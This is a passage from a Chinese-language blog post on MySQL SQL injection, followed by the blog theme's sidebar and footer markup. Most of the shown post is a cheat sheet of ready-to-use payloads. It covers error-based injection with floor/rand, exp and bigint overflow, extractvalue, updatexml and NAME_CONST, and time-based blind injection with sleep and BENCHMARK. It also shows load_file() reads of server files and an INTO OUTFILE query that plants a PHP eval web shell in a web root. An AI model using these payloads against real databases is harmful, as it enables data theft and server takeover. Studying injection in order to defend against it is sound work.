+<p>如果关键表被禁用，可以使用如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span> <span class="keyword">select</span> !<span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br></pre></td></tr></table></figure></p>
+<p>如果rand禁用，可以使用:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">min</span>(@a:=<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">password</span>,@a:=(@a+<span class="number">1</span>)%<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="exp进行SQL报错注入"><a href="#exp进行SQL报错注入" class="headerlink" title="exp进行SQL报错注入"></a>exp进行SQL报错注入</h3><p>当传递进去的值大于709时，exp()(以e为底的对数函数)引起一个溢出错误</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>()a)))   <span class="keyword">double</span>型超出范围</span><br></pre></td></tr></table></figure>
+<h3 id="bigint溢出"><a href="#bigint溢出" class="headerlink" title="bigint溢出"></a>bigint溢出</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x) - ~<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>~0是对0逐位取反</p>
+<p>此外，还有:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line">updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>))x;  //mysql 重复特性，此处重复了 version，所以报错</span><br></pre></td></tr></table></figure></p>
+<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23    //条件为假，执行sleep()</span><br><span class="line"></span><br><span class="line">union <span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">substr</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">CHAR</span>(<span class="number">119</span>),<span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">ENCODE</span>(‘M SG’,’<span class="keyword">by</span> <span class="number">5</span> seconds’)),<span class="literal">null</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1;</span><br></pre></td></tr></table></figure>
+<p>以此类推</p>
+<h2 id="导入导出相关操作"><a href="#导入导出相关操作" class="headerlink" title="导入导出相关操作"></a>导入导出相关操作</h2><p>文件权限</p>
+<p>下面的语句可以查询用户读写文件操作权限<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> file_priv <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span> = <span class="string">'username'</span>;	需要root用户来执行</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> grantee, is_grantable <span class="keyword">FROM</span> information_schema.user_privileges <span class="keyword">WHERE</span> privilege_type = <span class="string">'file'</span> <span class="keyword">AND</span> grantee <span class="keyword">like</span> <span class="string">'%username%'</span>;	普通用户都可以</span><br></pre></td></tr></table></figure></p>
+<h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>读取文件并返回该文件的内容作为一个字符串</p>
+<p>使用条件:</p>
+<ol>
+<li>必需有权限读取并且文件必需完全可读</li>
+</ol>
+<p>and (select count(*) from mysql.user)&gt;0   如果结果返回正常，说明有读写权限</p>
+<ol start="2">
+<li><p>欲读取文件必需在服务器上</p>
+</li>
+<li><p>必需指定文件的完整路径</p>
+</li>
+<li><p>读取的文件必需小于max_allowed_packet</p>
+</li>
+<li><p>load_file() 函数操作文件的当前目录是@@datadir</p>
+</li>
+</ol>
+<p>在实际的注入中，需要解决两个难题:</p>
+<ul>
+<li>绝对的物理路径</li>
+<li>构造有效的畸形语句(报错爆出绝对路径)</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="keyword">hex</span>(<span class="keyword">replace</span>(<span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">99</span>,<span class="number">58</span>,<span class="number">92</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">92</span>,<span class="number">115</span>,<span class="number">97</span>,<span class="number">109</span>))))</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">99</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>))</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">load_file</span>(<span class="number">0x633a2f626f6f742e696e69</span>)</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">load_file</span>(c:\\boot.ini)</span><br></pre></td></tr></table></figure>
+<h3 id="文件导入到数据库"><a href="#文件导入到数据库" class="headerlink" title="文件导入到数据库"></a>文件导入到数据库</h3><p>load data infile用于高速地从一个文本文件中读取行，并装入一个表中。文件名必须为一个文字字符串</p>
+<p>load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’ lines terminated by ‘\n’<br>将/tmp/t0.txt导入到t0表中，character set gbk设置字符集设置为gbk。fields terminated by是每一项数据之间的分隔符，lines terminated by时行的结尾符。<br>当错误代码为2时，文件不存在。当错误代码为13时候没有权限。</p>
+<h3 id="导入到文件"><a href="#导入到文件" class="headerlink" title="导入到文件"></a>导入到文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select.....into <span class="keyword">outfile</span> <span class="string">'file_name'</span></span><br></pre></td></tr></table></figure>
+<p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此必须有file权限才可以使用。file_name不是一个已经存在的文件</p>
+<p>有两种方式:</p>
+<ol>
+<li>直接select内容导入到文件中</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &lt;?php @eval($_post[<span class="string">"mima"</span>])?&gt; <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"c:\\phpnow\\htdocs\\test.php"</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>修改文件结尾<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>() <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"c:\\phpnow\\htdocs\\test.php"</span> <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="number">0x16</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/avatar.png" alt="张Mini's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        718067115@qq.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                الرئيسية
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    أرشيف
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2018/05/">May 2018<span class="sidebar_archives-count">1</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+
+    <!-- Pages  -->
+    
+
+    <!-- Article Number  -->
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+    <div class="sidebar-divider"></div>
+
+
+<!-- Theme Material -->
+
+    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
+        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
+            سمة - Material
+            <span class="sidebar-badge badge-circle">i</span>
+        </div>
+    </a>
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+        <a href="https://www.google.com/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
+                <span class="visuallyhidden">Google Plus</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://www.github.com/AlittleXYZ" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>张Mini
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
